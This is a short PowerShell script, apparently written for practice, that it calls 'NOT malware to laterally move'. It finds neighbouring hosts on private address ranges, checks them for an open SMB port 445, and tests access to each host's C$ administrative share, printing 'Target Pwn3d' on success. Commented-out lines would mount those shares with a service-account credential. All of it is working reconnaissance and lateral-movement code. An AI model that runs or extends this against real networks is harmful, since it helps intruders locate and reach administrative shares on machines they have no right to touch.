#Write some NOT malware to laterally move
#yay
$targetlist = @()

$net_neighbours = Get-NetNeighbor -AddressFamily IPv4

foreach($node in $net_neighbours){
$node.IPAddress
$target = "\\"+$node.IPAddress+"\c$"
$target
#$cred = Get-Credential -Credential Contoso\ServiceAccount
#New-PSDrive -Name "T" -Root $target -Persist -PSProvider "FileSystem"
$nets = $node.IPAddress.ToString() -split "\."
$nets[0]

$ipranges = ("192","172","10")

if($nets[0] -in $ipranges){
write-host "Local Network Address Found" -ForegroundColor Green
If($nets -notcontains "255"){
write-host "Local Unicast Address Found" -ForegroundColor Green

$node.IPAddress

$targetlist += $node.IPAddress
#if(Get-ChildItem –path $target ){write-host "WINNING" -ForegroundColor Red}

#$cred = Get-Credential -Credential Contoso\ServiceAccount
#New-PSDrive -Name "T" -Root $target -Persist -PSProvider "FileSystem"

}
}

}

$smblist = @()
$targetlist
foreach($target in $targetlist){
$smblist += Test-NetConnection -ComputerName $target -Port 445
}

$smbopenlist = $smblist | Where-Object TcpTestSucceeded -EQ $True

$specific_targets = $smbopenlist | Select-Object -Property computername

Foreach($victim in $specific_targets){
$victim
$path = "\\"+$victim.ComputerName.tostring()+"\c$"
if(dir $path -ErrorAction SilentlyContinue){Write-host "Target Pwn3d" -ForegroundColor Red}
}
